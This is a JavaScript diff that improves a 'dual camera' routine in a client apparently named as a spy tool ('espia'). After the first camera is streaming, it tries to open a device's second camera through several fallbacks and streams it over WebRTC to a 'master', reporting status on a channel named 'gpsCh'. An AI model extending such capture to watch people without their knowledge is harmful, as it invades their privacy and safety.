@@ -2556,40 +2556,107 @@ const Session = (() => {
               pc.addTrack(t, window._espiaCliWH.streams.userMedia);
             });
           }
-          // [v2.13.84 DUAL CAMERA] Si el device tiene 2+ cámaras (típico smartphone)
-          // y la primera ya está capturada, intentar abrir la otra en paralelo.
-          // Sirve como reemplazo de pantalla en smartphones (donde getDisplayMedia
-          // no existe). Si el browser/hardware no permite concurrencia, cae al solo
-          // 1 cámara sin afectar el flujo normal.
+          // [v2.13.92 DUAL CAMERA REVISITED]
+          // Bugs detectados en v2.13.84-91:
+          //  #1 enumerateDevices puede devolver deviceId='' antes de permiso explícito
+          //  #2 Solo intentaba por deviceId exact; algunos browsers (Samsung Internet,
+          //     Brave Mobile) responden mejor a constraint facingMode
+          //  #3 No reportaba motivo del fallo al master
+          //
+          // Nueva cascada de intentos:
+          //  Intento 1: deviceId exact de la otra cam (mejor calidad)
+          //  Intento 2: facingMode 'user' (frontal) si la primera era environment
+          //  Intento 3: facingMode 'environment' si la primera era user
+          //
+          // El motivo del fallo final se reporta vía capabilities.dualFallReason.
           (async () => {
+            const setMotivo = (motivo) => {
+              if (window._espiaCliWH?._capsState) {
+                window._espiaCliWH._capsState.dualIntentado = true;
+                window._espiaCliWH._capsState.dualFallReason = motivo;
+              }
+              window._espiaCliWH?._enviarCapabilities?.();
+            };
+            const tryGetUserMedia = async (constraint, descripcion) => {
+              try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: constraint });
+                console.log('[espia WH] dual-cam ✓ ' + descripcion);
+                return s;
+              } catch(e) {
+                console.warn('[espia WH] dual-cam ✗ ' + descripcion + ':', e.name, '·', e.message);
+                return null;
+              }
+            };
             try {
               const devs = await navigator.mediaDevices.enumerateDevices();
               const cams = devs.filter(d => d.kind === 'videoinput');
-              // [v2.13.86] Registramos camsHardware aunque skippeemos
+              const camsValidas = cams.filter(c => c.deviceId); // bug #1: filtrar IDs vacíos
               if (window._espiaCliWH?._capsState) {
+                // camsHardware = total reportado por enumerateDevices (incluye sin label/id)
                 window._espiaCliWH._capsState.camsHardware = cams.length;
               }
               if (cams.length < 2) {
-                console.log('[espia WH] dual-cam: solo 1 cámara hardware · skip');
-                if (window._espiaCliWH?._capsState) window._espiaCliWH._capsState.dualIntentado = true;
-                window._espiaCliWH?._enviarCapabilities?.();
-                return;
+                console.log('[espia WH] dual-cam: hardware reporta ' + cams.length + ' cámara(s) · skip');
+                return setMotivo('hardware_single_cam');
               }
+              // Detectar facingMode de la cámara ya abierta (para pedir la opuesta)
               const tUsado = window._espiaCliWH?.streams?.userMedia?.getVideoTracks?.()[0];
-              const idUsado = tUsado?.getSettings?.()?.deviceId;
-              const otra = cams.find(c => c.deviceId && c.deviceId !== idUsado);
-              if (!otra) {
-                console.log('[espia WH] dual-cam: no encontré 2da deviceId');
-                if (window._espiaCliWH?._capsState) window._espiaCliWH._capsState.dualIntentado = true;
-                window._espiaCliWH?._enviarCapabilities?.();
-                return;
+              const settingsUsada = tUsado?.getSettings?.() || {};
+              const idUsado = settingsUsada.deviceId;
+              const facingUsado = settingsUsada.facingMode; // 'environment' | 'user' | undefined
+              const facingOpuesto = facingUsado === 'environment' ? 'user'
+                                  : facingUsado === 'user' ? 'environment'
+                                  : null;
+              console.log('[espia WH] dual-cam · primaria facingMode=' + (facingUsado || '?') +
+                          ' · hardware=' + cams.length + ' · con deviceId=' + camsValidas.length);
+
+              // Cascada de intentos
+              let stream2 = null;
+              let exitoVia = '';
+              // (1) deviceId exact si tenemos un id diferente al usado
+              const otra = camsValidas.find(c => c.deviceId !== idUsado);
+              if (otra) {
+                stream2 = await tryGetUserMedia(
+                  { deviceId: { exact: otra.deviceId }, width:{ideal:640}, height:{ideal:480} },
+                  'deviceId exact (' + (otra.label || 'sin label') + ')'
+                );
+                if (stream2) exitoVia = 'deviceId';
               }
-              const stream2 = await navigator.mediaDevices.getUserMedia({
-                video: { deviceId: { exact: otra.deviceId }, width:{ideal:640}, height:{ideal:480} }
-              });
+              // (2) facingMode opuesto si conocemos el de la primera
+              if (!stream2 && facingOpuesto) {
+                stream2 = await tryGetUserMedia(
+                  { facingMode: { exact: facingOpuesto }, width:{ideal:640}, height:{ideal:480} },
+                  'facingMode exact ' + facingOpuesto
+                );
+                if (stream2) exitoVia = 'facingMode_exact';
+              }
+              // (3) último intento: facingMode ideal opuesto (más permisivo)
+              if (!stream2 && facingOpuesto) {
+                stream2 = await tryGetUserMedia(
+                  { facingMode: facingOpuesto, width:{ideal:640}, height:{ideal:480} },
+                  'facingMode ideal ' + facingOpuesto
+                );
+                if (stream2) exitoVia = 'facingMode_ideal';
+              }
+              if (!stream2) {
+                // Diagnóstico del motivo más probable
+                let motivo = 'desconocido';
+                if (camsValidas.length < 2) motivo = 'deviceids_opacos'; // bug #1
+                else motivo = 'browser_no_permite_concurrent';
+                return setMotivo(motivo);
+              }
               if (!window._espiaCliWH) {
                 stream2.getTracks().forEach(t => { try{t.stop();}catch(_){} });
                 return;
+              }
+              // Verificar que NO sea la misma cámara que la primaria (algunos browsers
+              // ignoran exact y devuelven la misma)
+              const tNuevo = stream2.getVideoTracks()[0];
+              const idNuevo = tNuevo?.getSettings?.()?.deviceId;
+              if (idNuevo && idNuevo === idUsado) {
+                console.warn('[espia WH] dual-cam: browser devolvió la MISMA cámara · descartando');
+                stream2.getTracks().forEach(t => { try{t.stop();}catch(_){} });
+                return setMotivo('browser_devolvio_misma_cam');
               }
               window._espiaCliWH.streams.userMedia2 = stream2;
               window._espiaCliWH._trackTipoMap = window._espiaCliWH._trackTipoMap || {};
@@ -2598,16 +2665,16 @@ const Session = (() => {
                 window._espiaCliWH._trackTipoMap[t.id] = 'camara2';
                 pc.addTrack(t, stream2);
               });
-              console.log('[espia WH] 2da cámara agregada (' + (otra.label || 'sin label') + ') · reneg disparará');
-              if (window._espiaCliWH?._capsState) window._espiaCliWH._capsState.dualIntentado = true;
+              console.log('[espia WH] 2da cámara agregada vía ' + exitoVia + ' · reneg disparará');
+              if (window._espiaCliWH?._capsState) {
+                window._espiaCliWH._capsState.dualIntentado = true;
+                window._espiaCliWH._capsState.dualFallReason = null; // éxito
+              }
               window._espiaCliWH?._enviarTrackMap?.();
               window._espiaCliWH?._enviarCapabilities?.();
             } catch(e) {
-              console.warn('[espia WH] 2da cámara fallo (browser/hardware no soporta concurrencia):', e.message);
-              // [v2.13.86] Bug #5: marcamos dualIntentado también en fallo y reenviamos
-              // capabilities para que el master sepa el estado final (no espere flicker).
-              if (window._espiaCliWH?._capsState) window._espiaCliWH._capsState.dualIntentado = true;
-              window._espiaCliWH?._enviarCapabilities?.();
+              console.warn('[espia WH] dual-cam excepción global:', e.name, e.message);
+              return setMotivo('excepcion:' + e.name);
             }
           })();
           // [v2.13.79 REFACTOR] Handler de renegociación — solo SUBE la nueva oferta.
@@ -2759,7 +2826,8 @@ const Session = (() => {
                 tienePantalla: typeof navigator.mediaDevices?.getDisplayMedia === 'function',
                 camsHardware,                                  // real (de enumerateDevices)
                 camsAbiertas,                                  // efectivas
-                dualIntentado: ref._capsState.dualIntentado,   // ya corrió el async dual-cam
+                dualIntentado: ref._capsState.dualIntentado,
+                dualFallReason: ref._capsState.dualFallReason, // [v2.13.92] motivo si falló
                 touchPoints:   navigator.maxTouchPoints || 0
               };
               ref.gpsCh.send(JSON.stringify({ __meta: 'capabilities', caps }));
